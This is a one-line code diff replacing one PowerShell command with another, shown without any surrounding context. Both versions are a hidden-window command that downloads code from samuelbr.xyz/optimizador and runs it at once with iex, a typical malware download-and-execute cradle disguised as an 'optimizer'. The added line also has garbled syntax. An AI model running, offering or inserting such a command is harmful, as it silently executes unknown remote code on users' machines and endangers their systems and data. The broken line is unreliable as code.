@@ -1,1 +1,1 @@
-powershell.exe -W Hidden -C "iex([System.Text.Encoding]::UTF8.GetString((iwr samuelbr.xyz/optimizador).Content))"
+powershell.exe -WindowStyle Hidden -Command "iex[Sy(stem.Text.Encoding]::UTF8.GetString((iwr samuelbr.xyz/optimizador).Content))"
